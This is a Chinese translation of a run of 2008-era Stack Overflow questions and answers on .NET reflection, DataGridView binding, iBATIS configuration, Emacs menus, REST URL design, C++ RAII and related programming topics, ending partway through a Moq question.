[我最初在这里](https://stackoverflow.com/questions/178645/how-does-wcf-deserialization-instantiate-objects-without-calling-a-constructor#179486)发布了这个答案，但这里是重印版，因为这不是完全相同的问题，但有相同的答案：

`FormatterServices.GetUninitializedObject()`将创建一个实例而不调用构造函数。我通过使用[Reflector](http://www.red-gate.com/products/reflector/index.htm)并挖掘了一些核心的 .Net 序列化类找到了这个类。

我使用下面的示例代码对其进行了测试，看起来效果很好：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Runtime.Serialization;

namespace NoConstructorThingy
{
    class Program
    {
        static void Main(string[] args)
        {
            MyClass myClass = (MyClass)FormatterServices.GetUninitializedObject(typeof(MyClass)); //does not call ctor
            myClass.One = 1;
            Console.WriteLine(myClass.One); //write "1"
            Console.ReadKey();
        }
    }

    public class MyClass
    {
        public MyClass()
        {
            Console.WriteLine("MyClass ctor called.");
        }

        public int One
        {
            get;
            set;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：72
> 
> 时间：2008-12-24T01:44:50.327

使用 CreateInstance 方法的这个重载：

```
public static Object CreateInstance(
    Type type,
    params Object[] args
) 
```

> 使用与指定参数最匹配的构造函数创建指定类型的实例。

请参阅：http: [//msdn.microsoft.com/en-us/library/wcxyzt4d.aspx](http://msdn.microsoft.com/en-us/library/wcxyzt4d.aspx)

* * *

## 回答 #3

> 赞同：23
> 
> 时间：2013-04-23T06:29:51.267

当我对它的性能进行[基准测试](https://stackoverflow.com/a/16162809/661933)`(T)FormatterServices.GetUninitializedObject(typeof(T))`时，它的速度较慢。同时编译的表达式会给你很大的速度改进，尽管它们只适用于具有默认构造函数的类型。我采用了混合方法：

```
public static class New<T>
{
    public static readonly Func<T> Instance = Creator();

    static Func<T> Creator()
    {
        Type t = typeof(T);
        if (t == typeof(string))
            return Expression.Lambda<Func<T>>(Expression.Constant(string.Empty)).Compile();

        if (t.HasDefaultConstructor())
            return Expression.Lambda<Func<T>>(Expression.New(t)).Compile();

        return () => (T)FormatterServices.GetUninitializedObject(t);
    }
}

public static bool HasDefaultConstructor(this Type t)
{
    return t.IsValueType || t.GetConstructor(Type.EmptyTypes) != null;
} 
```

这意味着 create 表达式被有效地缓存，并且仅在第一次加载类型时才会产生惩罚。也会以有效的方式处理值类型。

称它为：

```
MyType me = New<MyType>.Instance(); 
```

*请注意，`(T)FormatterServices.GetUninitializedObject(t)`字符串将失败。因此，对字符串进行了特殊处理以返回空字符串。*

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-22T11:48:45.270

很好的答案，但在点网紧凑框架上无法使用。这是一个适用于 CF.Net 的解决方案...

```
class Test
{
    int _myInt;

    public Test(int myInt)
    {
        _myInt = myInt;
    }

    public override string ToString()
    {
        return "My int = " + _myInt.ToString();
    }
}

class Program
{
    static void Main(string[] args)
    {
        var ctor = typeof(Test).GetConstructor(new Type[] { typeof(int) });
        var obj = ctor.Invoke(new object[] { 10 });
        Console.WriteLine(obj);
    }
} 
```

# development-environment - 寻找替代的协作开发环境

> ID：390580
> 
> 赞同：-2
> 
> 时间：2008-12-24T01:36:22.153
> 
> 标签：development-environment, collaboration

我对协作开发很感兴趣，我想知道除了使用N-Brain 的[UNA（示例视频）之外，是否还有其他解决方案。](http://www.vimeo.com/1653402)免费会更好，但我想这不是这种技术的选择。

PS：我正在寻找的主要未来是在同一代码中与多人实时工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T02:03:57.167

如果你在 Mac 世界，[SubEthaEdit](http://www.subethaedit.net/)是一个不错的选择。不是免费的，但 29 欧元也不错。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-24T02:51:32.203

经过一番进一步的搜索，我发现**[Gobby](http://gobby.0x539.de/trac/)**似乎比[MoonEdit 好得多](http://moonedit.com/)。
不要认为有比颜色编码更好的免费程序支持开发。

我希望这个问题也能帮助其他人。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T02:27:46.353

感谢查理，我找到[了 MoonEdit](http://moonedit.com/)，但我仍在寻找更好的选择......

# data-binding - 自定义 DataGridViewColumn(WinForms) 中多个字段的自定义绑定

> ID：390584
> 
> 赞同：3
> 
> 时间：2008-12-24T01:37:08.627
> 
> 标签：data-binding, datagridview, datagridviewcolumn

我对自定义 DataGridViewColumn 的数据绑定（多个属性）有疑问。这是我拥有的控件的架构，我需要使其可与 DataGridView 数据源绑定。任何想法或链接到讨论此事的文章？

**控件**

*   图形控件（自定义）：显示在自定义的 DataGridView 列中。具有“开始日期”、“结束日期”、Windows 图表控件等属性，该控件本身是可绑定的等。
*   自定义单元格（DataGridViewCustomCell继承自DataGridViewCell），持有Graph控件并处理一些事件（例如，OnEnter事件，将焦点传递给自定义Graph列，用于拖放类型的事件等）
*   定义单元格模板类型的自定义列（DataGridViewCustomColumn 继承自 DataGridViewColumn）： CellTemplate = new DataGridViewCustomCell(); 也是数据绑定的首选

**数据结构：**

*   要在其他 DataGridView 列中显示的主表
*   图形表 - 通过父子关系与主表相关。保存图形数据
*   图表表通过父子关系与图表表相关。保存 win-form 图表的数据，它是我的 Graph 控件的一部分。

到目前为止，我什至无法将 Graph 表中的数据绑定到 Graph 控件或 Graph-holding Column/Cell。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T22:25:35.943

谢谢您的回答。我的数据源不是 SQL 数据源，事实上我在谈论用于 win-forms 的 datagridview（我不确定这是否清楚）。

由于我在任何一个论坛上都没有得到答复，所以我想，我会为那些可能有类似问题和可能批评的人概述我想出的解决方案。:-)

（步骤 1-2 在著名的 MS 示例中也有说明） 1\. 创建您自己的继承自 DataGridViewColumn 和 DataGridViewCell 的类，设置列模板；2\. 创建你的“CustomEdit”控件

3.  在数据项中，无论是 DataRow 还是 List 项，都添加一个只读属性，该属性返回对象本身。此属性绑定到自定义列。

自定义单元格：

```
public partial class MyCell : DataGridViewCell 
 {
    protected override void Paint(...)
        {...} // draws control
              // receives data item as a value 
              // in my case I have to custom-draw entire control in this fnc.
    public override void InitializeEditingControl(...)
        {...} // initialize control editing
    // override some other properties
    public override Type EditType {
        get{ 
           return typeof(MyEditControl);
        }
    }
    public override Type ValueType{
        get{
           return typeof(MyItem);
        }
    }
 } 
```

自定义列：

```
public partial class MyColumn : DataGridViewColumn
{
    public MyColumn(){ ...
    CellTemplate = new MyCell();
    }
} 
```

编辑控制：

```
public partial class MyEditControl : UserControl, IDataGridViewEditingControl
{... // implements IDataGridViewEditingControl
     // value is our data item
} 
```

数据项，数据源变为 List<MyItem>

```
public class MyItem:Object{
    ...
    [XmlIgnore] // I need it because I do serialization
    public MyItem Self {
        get {
            return this;
        }
    }
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T17:28:54.223

[在这里](https://stackoverflow.com/questions/389737/databinding-with-a-datagridview-c)查看我的问题

这很容易做到，你只是不使用 IDE 来做，你可以用代码来做。这是很多工作，但如果你知道自己在做什么，这并不难。我从一无所知到能够在不到一天的时间内做到这一点，所以我相信你一定能做到。

编辑：您还可以在填充 datagridview 的 sql 中使用 Join

# c# - C#通过属性反射设置属性值

> ID：390594
> 
> 赞同：20
> 
> 时间：2008-12-24T01:43:04.247
> 
> 标签：c#, reflection

我正在尝试通过 classes 属性上的属性构建对象，该属性指定提供的数据行中的列，该列是属性的值，如下所示：

```
 [StoredDataValue("guid")]
    public string Guid { get; protected set; }

    [StoredDataValue("PrograGuid")]
    public string ProgramGuid { get; protected set; } 
```

在基础对象的 Build() 方法中，我将这些属性上设置的属性值设置为

```
 MemberInfo info = GetType();
        object[] properties = info.GetCustomAttributes(true); 
```

然而，在这一点上，我意识到我的知识有限。

首先，我似乎没有恢复正确的属性。

既然我有了属性，如何通过反射设置这些属性？我在做/思考一些根本不正确的事情吗？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2008-12-24T01:54:16.360

这里有几个单独的问题

*   `typeof(MyClass).GetCustomAttributes(bool)`（或`GetType().GetCustomAttributes(bool)`）返回类本身的属性，而不是成员的属性。您必须调用`typeof(MyClass).GetProperties()`以获取类中的属性列表，然后检查每个属性。

*   一旦你得到了这个属性，我认为你应该使用`Attribute.GetCustomAttribute()`而不是`MemberInfo.GetGustomAttributes()`因为你确切地知道你在寻找什么属性。

这里有一个小代码片段可以帮助您开始：

```
PropertyInfo[] properties = typeof(MyClass).GetProperties();
foreach(PropertyInfo property in properties)
{
    StoredDataValueAttribute attribute =
        Attribute.GetCustomAttribute(property, typeof(StoredDataValueAttribute)) as StoredDataValueAttribute;

    if (attribute != null) // This property has a StoredDataValueAttribute
    {
         property.SetValue(instanceOfMyClass, attribute.DataValue, null); // null means no indexes
    }
} 
```

**编辑**：不要忘记`Type.GetProperties()`默认情况下只返回公共属性。您还必须使用`Type.GetProperties(BindingFlags)`来获取其他类型的属性。

# web-config - 从 web.config 检索 IBATIS.NET 连接字符串的最佳方法

> ID：390595
> 
> 赞同：3
> 
> 时间：2008-12-24T01:43:42.543
> 
> 标签：web-config, ibatis.net

我有一个 web 应用程序，我需要在 web.config 中加密和存储连接字符串。

检索此内容并将此连接字符串与 IBATIS.NET 一起使用而不是将连接字符串存储在 SqlMap.config 中的最佳方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-04T01:10:26.617

[此讨论线程](http://www.mail-archive.com/user-cs@ibatis.apache.org/msg01556.html)的最后三个消息讨论您想要什么。

本质上，您在调用 Configure() 之前覆盖了 iBATIS 从配置文件加载的连接字符串。

例如，在您的 SqlMap.config 中：

```
 <database>
      <provider name="sqlServer2005" />
      <dataSource name="TheDB" connectionString="${connectionString}"/>
   </database> 

```

在您配置构建器的代码中，例如：

```
 DomSqlMapBuilder builder;
string connection;
NameValueCollection properties;

connection = AccessTheEncryptedStringHere();

// Put the string in collection to pass to the iBATIS configurator
properties = new NameValueCollection();
properties.Add("connectionString", connection);

// Build the iBATIS configurator
builder = new DomSqlMapBuilder();
builder.Properties = properties;
builder.Configure("SqlMap.config"); 

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-14T06:30:19.907

你在看这个吗？从 web.config 中检索加密的连接字符串——

你可以试试这个。代码——连接字符串的名称是omni_dbConnectionString

字符串 connectionString = ConfigurationManager.ConnectionStrings["myProtectedConfigProvider"].ProviderName;

或者

字符串 connectionString = ConfigurationManager.ConnectionStrings["omni_dbConnectionString"].ConnectionString;

# winforms - .NET Compact Framework 的 WinForm 控件

> ID：390598
> 
> 赞同：3
> 
> 时间：2008-12-24T01:46:24.737
> 
> 标签：winforms, windows-mobile, compact-framework, user-controls

我正在为 Windows Mobile 5 及更高版本的 Compact Framework 3.5 项目投资 UI 控件工具包。我能找到的只有 Resco MobileForms Toolkit ( [http://www.resco.net/developer/mobileformstoolkit/overview.aspx](http://www.resco.net/developer/mobileformstoolkit/overview.aspx) )。我有两个问题...

还有其他好的 WinForm 控件集合吗？

有使用 Resco 控件的经验吗？他们过得怎么样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T04:01:00.753

那么[智能设备框架](http://www.smartdeviceframework.com/)呢？GUI 组件看起来不像 Resco 工具包中的那些花哨，但 SDF 似乎有更广泛的基本选择（[SDF doc](http://www.opennetcf.com/library/sdf/)）。我从来没有使用过（只在 WinCE 上使用过 MFC），但也想听听 CF 开发经验。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-07-24T08:36:29.367

MiraByte 有[这些控件](http://www.mirabyte.com/de/produkte/windows-mobile.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-11-19T13:29:05.770

在 Resco 工具包上 +1。我已经使用了很长一段时间了，我必须说，如果你需要漂亮的 UI，它们就是你要走的路。除了 Ivan 已经说过的，用于 AdvancedList 或 DetailView 之类的 WYSIWYG 模板设计器让您可以轻松地完成令人印象深刻的事情。

# .net - .NET 通讯应用程序

> ID：390599
> 
> 赞同：6
> 
> 时间：2008-12-24T01:46:42.600
> 
> 标签：.net, newsletter

是否有任何用 .NET 编写的时事通讯应用程序可用作开源软件？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-24T03:42:49.510

检查[CodePlex](http://www.codeplex.com/site/search?projectSearchText=newsletter)，它们是一些有趣的项目，例如：

*   [.NET 2.0 的网络通讯应用程序](http://www.codeplex.com/newsletter)
*   [SP通讯](http://www.codeplex.com/SPNewsletter)
*   [XZ 邮件](http://www.codeplex.com/xzmailings)

# user-interface - 用于调用“GUI 样式”菜单的 Emacs Mx 命令

> ID：390602
> 
> 赞同：10
> 
> 时间：2008-12-24T01:48:42.190
> 
> 标签：user-interface, emacs, scripting, elisp, command

**问题：**在我的 Emacs 变体使用特定于操作系统的桌面功能的情况下，我如何才能找到在 Emacs 中执行基于 GUI 的操作的 Mx 等效命令？

**背景：**传统的理解是，Emacs 中的一切都是命令，只要知道命令的名称，就可以通过 Mx 调用命令。假设这个陈述是正确的，那么在基于“桌面”的 Emacs 变体中找到用于触发“GUI 样式”菜单的命令名称的方法是什么？

例如，如果我用鼠标选择文件菜单来打开一个文件，操作系统特定的“GUI”风格的文件打开对话框会弹出，等待我的输入。

我怎样才能找到做同样事情的 Mx 等效命令？

我*认为*describe-key 会告诉我我需要知道的内容，但它指示使用：

```
M-x menu-find-file-existing 
```

不调用“GUI”样式的文件打开对话框。相反，它使用 Emacs 内部的非 GUI-OS-neutral 变体。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-24T14:51:06.447

*你需要让 Emacs 认为键盘没有被*使用，这不如让 Emacs 认为使用了鼠标那么直观。:)

```
(defadvice find-file-read-args (around find-file-read-args-always-use-dialog-box act)
  "Simulate invoking menu item as if by the mouse; see `use-dialog-box'."
  (let ((last-nonmenu-event nil))
    ad-do-it)) 
```

在 WinXP 上的 Emacs 22.2.1 上测试。不过，我相信该范式已经存在了一段时间，因此它应该适用于较旧的 Emacs。不知道 XEmacs 是否类似地工作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-24T01:57:18.490

哇，我很高兴你这么问。我一直想自己查一下。

`C-h k`后面的菜单选择会告诉你这一点。例如，这里是您从选择菜单/编辑/粘贴中得到的：

```
<menu-bar> <edit> <paste> 运行命令 clipboard-yank
  这是 `menu-bar.el' 中的一个交互式编译的 Lisp 函数。
它绑定到 <paste>、<f18>、<menu-bar> <edit> <paste>。
（剪贴板猛拉）
插入剪贴板内容，或最后一段被杀死的文本。

```

如果您想了解详细信息，请点击`menu-bar-el`LISP 源的链接：

```
(defun menu-find-file-existing ()
  "Edit the existing file FILENAME."
  (interactive)
  (let* ((mustmatch (not (and (fboundp 'x-uses-old-gtk-dialog)
                  (x-uses-old-gtk-dialog))))
     (filename (car (find-file-read-args "Find file: " mustmatch))))
    (if mustmatch
    (find-file-existing filename)
      (find-file filename)))) 
```

# web-services - 有关 REST URL 的详细问题

> ID：390604
> 
> 赞同：1
> 
> 时间：2008-12-24T01:49:25.027
> 
> 标签：web-services, rest

这是那些小细节（也可能是宗教）问题之一。假设我们正在构建一个 REST 架构，为了明确起见，假设服务需要三个参数*x*、*y*和*z*。阅读有关 REST 的各种作品，似乎应该将其表示为类似的 URI

> [http://myservice.example.com/service/](http://myservice.example.com/service/) *x* / *y* / *z*

过去写过很多 CGI，表达这一点似乎很自然

> [http://myservice.example.com/service?x=val,y=val,z=val](http://myservice.example.com/service?x=val,y=val,z=val)

有什么特别的理由更喜欢全斜线形式吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-24T01:56:38.960

原因很小，但在这里。

酷 URI 的不要更改。

该`http://myservice.example.com/resource/x/y/z/`表格在上帝和所有人面前宣称这是通往*特定*资源的途径。

> 请注意，我更改了名称。可能涉及到一项服务，但 REST 原则是您正在描述一个特定的 Web 资源，名为`/x/y/z/`.

该`http://myservice.example.com/service?x=val,y=val,z=val`表格并没有提出那么强烈的要求。它说有一段名为的代码`service`将尝试进行某种查询。没有保证。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-10T15:39:48.037

查询参数很少“酷”。看看 Google Chart API。应该对所有字段使用 /full/path/notation 吗？如果有的话，每个 URL 会不会很酷？

查询参数很有用。可选字段可以省略。可以添加新键以支持新功能。随着时间的推移，旧字段可以被弃用和删除。使用 /path/notation 这样做会更笨拙。

引用自[http://www.xml.com/pub/a/2004/08/11/rest.html](http://www.xml.com/pub/a/2004/08/11/rest.html)

> URI 不透明度 [BP]
> 
> URI 的创建者决定 URI 的编码，用户不应从 URI 本身派生元数据。URI 不透明度仅适用于 URI 的路径。查询字符串和片段具有用户可以理解的特殊含义。服务和它的消费者之间必须有一个共享的词汇表。

这听起来像查询字符串是你想要的。

查询字符串的一个缺点是它们是无序的。以“?x=1&y=2”结尾的 GET 不同于以“?y=2&x=1”结尾的 GET。这意味着浏览器和任何其他中间系统将无法缓存它，因为缓存是基于完整的 URL 完成的。如果这是一个问题，则以明确定义的顺序生成查询字符串。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-17T10:50:14.433

在构建 URI 时，这是我遵循的原则。我不知道它是否在所有情况下都完全可以接受

例如，我必须获取员工的详细信息，那么 URI 将采用以下形式：

**GET /employees/1/**而不是**GET /employees?id=1**，因为我将每个员工都视为资源，并且整个 URI“ **employees/{id}”**用于标识资源。

另一方面，如果我的算法操作不能识别特定资源，而只需要输入算法来识别资源，那么我使用查询字符串。

例如 GET **/employees?empname='%Bob%'&maxResults=100**可能会给我所有姓名中包含 Bob 单词的员工，查询返回的最大结果限制为 100。

希望这能回答你的问题

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2010-08-01T19:40:49.393

URI 被严格分为分层部分（路径）和非分层路径（查询），**两者都用于标识资源**

URI 规范本身 ( [RFC 3986](http://www.faqs.org/rfcs/rfc3986.html) ) 清楚地将 URI 的路径和查询部分设置为相等。

第 3.3 节：

> 路径组件包含与查询组件一起用于识别资源的数据[...]。

第 3.4 节：

> 查询组件包含 [...] 数据，这些数据与 [...] 路径组件一起用于识别资源

因此，您在使用`x/y/z`vs时的选择`x=val&y=val&z=val`主要取决于 x、y 或 z 本质上是分层的还是非分层的，以及在可预见的未来您是否可以将它们视为始终是分层的或非分层的，以及您在选择其中一个时可能遇到的任何技术限制。

但是要回答您的问题，正如其他人所指出的那样：两者都不比另一个更 RESTful，因为它们最终都标识了资源。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-24T03:44:01.537

如果资源是服务，独立于参数，它应该是

```
http://myservice.example.com/service?x=val&y=val&z=val 
```

这是一个 GET 查询。REST 背后的原则之一是您可以 GET 读取（但不能修改！）资源；您可以 POST 修改资源并获得响应；您可以 PUT 写入资源；您可以 DELETE 删除资源。

如果具有这些参数的特定资源是持久资源，则它需要一个名称。您可以（如果您以这种方式组织您的网络服务） POST 以`http://myservice.example.com/service?x=val&y=val&z=val`创建服务的特定实例并让它返回一个 ID 来命名该实例，例如

```
http://myservice.example.com/service/12312549 
```

然后使用 GET/POST/PUT/DELETE 与该实例进行交互。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-07-20T19:13:49.900

首先，将 URI 定义为 API 的一部分违反了 REST 架构的约束。您不能这样做并调用您的 API RESTful。

其次，查询参数对非查询资源访问不利的原因是它们通常不被缓存。这也违反了 HTTP 标准。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2009-02-10T15:54:29.780

带有斜杠的 URL`/x/y/z/`会施加层次结构，不适合仅传递三个参数的确切情况。

如果像你说的那样，xyz 确实只是参数并且顺序并不重要，那么使用分号会更加 RESTful：

```
http://myservice.example.com/service/x;y;z/ 
```

但是，如果您的“服务”只是一种对不同参数具有相同作用的算法，那么使用`?x=val`格式也没有什么 unRESTful 的。

# language-agnostic - While vs. Do While

> ID：390605
> 
> 赞同：0
> 
> 时间：2008-12-24T01:49:54.230
> 
> 标签：language-agnostic, loops

我已经多次看到这两个代码块在使用中，我个人一直使用第一个，但我的问题是：是否存在功能差异，如果存在差异是什么？

```
while (condition is true ) {
    // do something
}

do {
    // do something
} while ( condition is true); 
```

我将把它应用于 PHP，但我认为这与语言无关。

# jquery - jQuery 和 ASP.NET AJAX

> ID：390611
> 
> 赞同：2
> 
> 时间：2008-12-24T01:53:09.560
> 
> 标签：jquery, asp.net-ajax

我们可以在 ASP Web 应用程序中结合 jQuery 和 ASP.NET AJAX 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T02:08:14.037

是的。有关警告和潜在的解决方法，请参阅：[Any downsides to using ASP.Net AJAX and JQuery together](https://stackoverflow.com/questions/65129/any-downsides-to-using-aspnet-ajax-and-jquery-together)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T02:35:09.600

考虑到[JQuery 旨在与 Visual Studio 一起提供](http://weblogs.asp.net/scottgu/archive/2008/09/28/jquery-and-microsoft.aspx)，我会说最肯定的。

而且，当然，我做得很好，没有任何明显的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T09:35:36.630

是的，您可以结合 ASP.Net Ajax 和 Jquery，但仅仅因为它们在 VS.Net 中一起发布并不意味着您应该在同一个项目中同时使用它们。

事实上，我建议完全相反。当您在表单上放置 ScripManager 时，ASP.Net Ajax 的下载量已经相当大，再加上 50 KB 的 Jquery，您的代码就会变得臃肿不堪。

如果您是 JQuery 粉丝，您可能已经在使用它来完成您使用 ASP.Net Ajax 所做的大部分工作，因此如果可以，请考虑完全摆脱 scriptmanager。

如果你不能这样做，或者如果你使用更新面板，那么通过这种方式将 JQuery 下载链接到 Google：

[http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min.js](http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min.js) （适用于 1.2.6 版）

Google 提倡以这种方式链接，以尽量减少一次又一次下载 JQuery 的必要性。如果大多数网站都从 Google 链接（Google 推广它的方式），那么用户每次访问使用它的网站时都不必下载 JQuery 的新副本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T01:57:54.807

大概是。

（没有更多关于你真正想要什么的信息，这是我能给出的最佳答案。）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-24T02:09:54.020

是的，我现在正在成功地做到这一点。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-12-24T02:34:56.560

是的。事实上，他们互相恭维得很好。不过，它们确实有一些重叠。MS Ajax 客户端库提供 .net 样式的标记和 js 中的数据处理。jQuery 主要是浏览器 DOM 的扩展。

我建议使用其中一个来进行页面加载/dom-ready 处理。如果您通过 ms-ajax 进行大量服务器端调用，我还建议您使用 ms-ajax 事件处理程序符号。

它归结为在重叠区域的使用中保持一致。

# c++ - 终于在 C++ 中

> ID：390615
> 
> 赞同：17
> 
> 时间：2008-12-24T01:56:14.000
> 
> 标签：c++, exception, try-catch, throw, finally

这是在标准 C++ 中实现类似最终行为的好方法吗？（无特殊指针）

```
class Exception : public Exception
    { public: virtual bool isException() { return true; } };

class NoException : public Exception
    { public: bool isException() { return false; } };

Object *myObject = 0;

try
{
  // OBJECT CREATION AND PROCESSING
  try
  {
    myObject = new Object();

    // Do something with myObject.
  }

  // EXCEPTION HANDLING
  catch (Exception &e)
  {
    // When there is an excepion, handle or throw,
    // else NoException will be thrown.
  }

  throw NoException();
}

// CLEAN UP
catch (Exception &e)
{
  delete myObject;

  if (e.isException()) throw e;
} 
```

1.  对象没有抛出异常 -> NoException -> 对象已清理
2.  对象抛出的异常 -> 已处理 -> NoException -> 对象已清理
3.  对象抛出的异常 -> 抛出 -> 异常 -> 对象清理 -> 抛出

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2008-12-24T02:07:37.377

标准答案是使用[资源分配即初始化](http://en.wikipedia.org/wiki/Resource_acquisition_is_initialization)缩写 RAII 的一些变体。基本上，您构造一个变量，该变量与finally之前块内的块具有相同的范围，然后在对象析构函数内的finally块中执行工作。

```
try {
   // Some work
}
finally {
   // Cleanup code
} 
```

变成

```
class Cleanup
{
public:
    ~Cleanup()
    {
        // Cleanup code
    }
}

Cleanup cleanupObj;

// Some work. 
```

这看起来非常不方便，但通常有一个预先存在的对象会为您进行清理。在您的情况下，您似乎想要破坏 finally 块中的对象，这意味着智能或唯一指针将执行您想要的操作：

```
std::unique_ptr<Object> obj(new Object()); 
```

或现代 C++

```
auto obj = std::make_unique<Object>(); 
```

无论抛出哪个异常，对象都会被破坏。回到 RAII，在这种情况下，资源分配是为 Object 分配内存并构造它，初始化是 unique_ptr 的初始化。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-12-24T02:08:52.353

不。构建 finally like 方式的标准方法是分离关注点（[http://en.wikipedia.org/wiki/Separation_of_concerns](http://en.wikipedia.org/wiki/Separation_of_concerns)）并使 try 块中使用的对象自动释放其析构函数中的资源（称为“范围绑定资源管理”）。由于析构函数是确定性地运行的，与 Java 不同，您可以依靠它们安全地进行清理。这样，获取资源的对象也将清理资源。

一种特殊的方法是动态内存分配。由于您是获取资源的人，因此您必须再次清理。在这里，可以使用智能指针。

```
try {
    // auto_ptr will release the memory safely upon an exception or normal 
    // flow out of the block. Notice we use the "const auto_ptr idiom".
    // http://www.gotw.ca/publications/using_auto_ptr_effectively.htm
    std::auto_ptr<A> const aptr(new A);
} 
// catch... 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-24T02:44:47.710

如果由于某种奇怪的原因您无法访问标准库，那么很容易实现您需要的智能指针类型来处理资源。它可能看起来有点冗长，但它的代码比那些嵌套的 try/catch 块要少，而且你只需要定义一次这个模板，而不是每个需要管理的资源一次：

```
template<typename T>
struct MyDeletable {
    explicit MyDeletable(T *ptr) : ptr_(ptr) { }
    ~MyDeleteable() { delete ptr_; }
private:
    T *ptr_;
    MyDeletable(const MyDeletable &);
    MyDeletable &operator=(const MyDeletable &);
};

void myfunction() {
    // it's generally recommended that these two be done on one line.
    // But it's possible to overdo that, and accidentally write
    // exception-unsafe code if there are multiple parameters involved.
    // So by all means make it a one-liner, but never forget that there are
    // two distinct steps, and the second one must be nothrow.
    Object *myObject = new Object();
    MyDeletable<Object> deleter(myObject);

    // do something with my object

    return;
} 
```

当然，如果您这样做，然后在其余代码中使用 RAII，您最终将需要标准和增强智能指针类型的所有功能。但这是一个开始，做我认为你想要的。

面对维护编程，try ... catch 方法可能不会很好地工作。CLEAN UP 块不能保证被执行：例如，如果“做某事”代码提前返回，或者以某种方式抛出不是异常的东西。另一方面，我的代码中“deleter”的析构函数保证在这两种情况下都会执行（尽管如果程序终止则不会）。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2008-12-24T14:14:09.127

我的建议是：不要试图模仿 C++ 中 try-finally 子句的行为。只需使用 RAII 代替。你会活得更快乐。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-24T02:08:10.543

假设您要删除指针 myObject 并避免内存泄漏，如果您所说的代码中有“return”语句，您的代码仍然无法执行此操作`// Do something with myObject.`（我假设真正的代码会在这里）

RAII 技术在特定对象的析构函数中具有相当于“finally”块的相关操作：

```
class ResourceNeedingCleanup
{
  private:
    void cleanup(); // action to run at end
  public:
    ResourceNeedingCleanup( /*args here*/) {}
    ~ResourceNeedingCleanup() { cleanup(); }  

    void MethodThatMightThrowException();
};

typedef boost::shared_ptr<ResourceNeedingCleanup> ResourceNeedingCleanupPtr;
// ref-counted smart pointer

class SomeObjectThatMightKeepReferencesToResources
{
   ResourceNeedingCleanupPtr pR;

   void maybeSaveACopy(ResourceNeedingCleanupPtr& p)
   {
      if ( /* some condition is met */ )
         pR = p;
   }
};

// somewhere else in the code:
void MyFunction(SomeObjectThatMightKeepReferencesToResources& O)
{
   ResourceNeedingCleanup R1( /*parameters*/) ;
   shared_ptr<ResourceNeedingCleanup> pR2 = 
        new ResourceNeedingCleanup( /*parameters*/ );
   try
   {
      R1.MethodThatMightThrowException();
      pR2->MethodThatMightThrowException();
      O->maybeSaveACopy(pR2);
   }
   catch ( /* something */ )
   {
      /* something */
   }

   // when we exit this block, R1 goes out of scope and executes its destructor
   // which calls cleanup() whether or not an exception is thrown.
   // pR2 goes out of scope. This is a shared reference-counted pointer. 
   // If O does not save a copy of pR2, then pR2 will be deleted automatically
   // at this point. Otherwise, pR2 will be deleted automatically whenever
   // O's destructor is called or O releases its ownership of pR2 and the
   // reference count goes to zero.
} 
```

我认为我的语义是正确的；我自己并没有使用多少shared_ptr，但我更喜欢它而不是auto_ptr<>——指向对象的指针只能由一个auto_ptr<>“拥有”。我使用了 COM 的[CComPtr](http://msdn.microsoft.com/en-us/library/aa266806(VS.60).aspx)及其变体，我自己为“常规”（非 COM）对象编写了类似于 shared_ptr<> 但具有 Attach() 和 Detach() 用于从一个智能传输指针指向另一个的指针。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2008-12-24T02:48:22.990

直接回答你的问题，**不**。

这是实现该功能的一种聪明方法，但它并不可靠。失败的一种方法是，如果您的“做某事”代码抛出了一个不是从`Exception`. 在那种情况下，你永远不会`delete myObject`。

这里有一个更重要的问题，那就是任何特定语言的程序员采用的方法。您听说[RAII](http://en.wikipedia.org/wiki/Resource_acquisition_is_initialization)的原因是，比您或我经验丰富的程序员发现，在 C++ 编程领域，这种方法是可靠的。您可以依赖其他程序员使用它，而其他程序员也希望依赖您使用它。

# c# - 使用 Moq 调用验证受保护的抽象方法

> ID：390632
> 
> 赞同：3
> 
> 时间：2008-12-24T02:14:46.833
> 
> 标签：c#, unit-testing, testing, moq

假设我有以下课程：

```
public class TestBase
{
  public bool runMethod1 { get; set; }

  public void BaseMethod() 
  {
    if (runMethod1)
      ChildMethod1();
    else 
      ChildMethod2();
  }

  protected abstract void ChildMethod1();
  protected abstract void ChildMethod2();
} 
```

我也有课

```
public class ChildTest : TestBase
{
